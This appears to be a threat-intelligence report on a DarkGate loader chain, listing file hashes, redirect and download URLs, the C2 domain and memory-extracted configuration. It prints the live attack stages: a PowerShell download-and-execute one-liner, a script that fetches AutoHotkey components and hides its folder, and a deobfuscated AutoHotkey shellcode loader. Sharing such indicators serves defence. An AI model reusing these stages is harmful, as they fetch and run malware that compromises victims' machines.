THREAT IDENTIFICATION: DARKGATE LOADER

PDF FILE HASHES
book04-02.4543732905.pdf
b48ebc0bbec3d75a8e9435400a7d76a0

URL FROM PDF FILE
https://monitor.clickcease.com//tracker/tracker?id=ii2024jWOUFIqArNt70&adpos=&nw=a&url=https://ecy.wcs520.com/wp-content/themes/evita/red.php?utm_content=wePbIpMxcA<redacted>

FIRST REDIRECT URL TO VBS FILE (referer)
https://ecy.wcs520.com/wp-content/themes/evita/red.php?utm_content=wePbIpMxcA

SECOND REDIRECT URL TO VBS FILE
https://dafabc.com/6Jxtk8?utm_content=wePbIpMxcA&se_referrer=

VBS FILE DOWNLOAD URL
https://butikal.com/wp-content/themes/evita/QB8788991_2024.vbs

VBS FILE HASH
QB8788991_2024.vbs
b878bdf7d7182f55eb7d88c2fa2a791d

POWERSHELL SCRIPT DOWNLOAD URL
http://31yc.com/zittkewz

INTERCEPTED POWERSHELL
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command Invoke-Expression (Invoke-RestMethod -Uri '31yc.com/zittkewz')

POWERSHELL SCRIPT FILE HASH
zittkewz
bcd6ac7d9d3f3e09db3f1b940c315e3f

POWERSHELL SCRIPT
ni 'C:/mcmc/' -Type Directory -Force;cd 'C:/mcmc/';Invoke-WebRequest -Uri "http://31yc.com/vaeincobqt" -OutFile 'C:/mcmc/temp_AutoHotkey.exe';[System.IO.File]::WriteAllBytes("C:/mcmc/AutoHotkey.exe",([System.IO.File]::ReadAllBytes("C:/mcmc/temp_AutoHotkey.exe")[1024..([System.IO.File]::ReadAllBytes("C:/mcmc/temp_AutoHotkey.exe").Length-1)]));Invoke-WebRequest -Uri "http://31yc.com/agbaxsgz" -OutFile 'C:/mcmc/script.ahk';Invoke-WebRequest -Uri "http://31yc.com/cskrhskn" -OutFile 'C:/mcmc/test.txt'; start 'C:/mcmc/AutoHotkey.exe' -a 'C:/mcmc/script.ahk';attrib +h 'C:/mcmc/'

PAYLOAD COMPONENTS DOWNLOAD URLS
http://31yc.com/vaeincobqt
(Saved as: C:/mcmc/temp_AutoHotkey.exe)

http://31yc.com/agbaxsgz
(Saved as: C:/mcmc/script.ahk )

http://31yc.com/cskrhskn
(Saved as: C:/mcmc/test.txt)

PAYLOAD COMPONENTS FILE HASHES
temp_AutoHotkey.exe
237ab425f48ea05cfcfc2a74020d2865

script.ahk
d7f1e4485c47277cc2e5eb26b4d6e390

test.txt
c4dc150435acb26afc275eee4f32be07

ADDITIONAL OBSERVED FILE 
AutoHotkey.exe
a59a2d3e5dda7aca6ec879263aa42fd3

DEOBFUSCATED AUTOHOTKEY SCRIPT
#NoTrayIcon
MEM_COMMIT := 0x1000
MEM_RESERVE := 0x2000
PAGE_EXECUTE_READWRITE := 0x40
archivo := A_ScriptDir . "\test.txt"
FileRead, contenidoHex, %archivo%
size := 473199
lpAddress := DllCall("VirtualAlloc", "Ptr", 0, "UInt", size, "UInt", MEM_COMMIT | MEM_RESERVE, "UInt", PAGE_EXECUTE_READWRITE)
Loop, % size {
hexByte := "0x" . SubStr(contenidoHex, 2 * A_Index - 1, 2)
NumPut(hexByte, lpAddress + (A_Index - 1), "Char")
}
DllCall(lpAddress)

UNPACKED PAYLOAD FILE HASH
4910b3d.exe
d3daa0335cb4596a9611201f818d1ee2

DARKGATE C2s
http://31yc.com/

DARKGATE CONFIGURATION INFORMATION (PULLED FROM MEMORY)
0x4b70f74 (1064): DOMAINS=31yc.com|
EPOCH=1712068908
0=31yc.com|
8=No
11=DarkGate
12=R0ijS0qCVITtS0e6xeZ
13=6
14=Yes
15=80
1=Yes
32=No
3=Yes
4=No
18=100
6=Yes
7=No
19=4096
5=No
21=No
22=No
23=No
31=Yes
24=.ahk
25=admin888
26=No
27=OPAdaWnS
28=No
29=2
tabla=Ab2a&*fP}zwkF.oRTUeIKSNpcrL"Q=gqm6) vBsx(YG4ty,8jEHd3Zu]750JX[1V{W$hiDlO9CMn

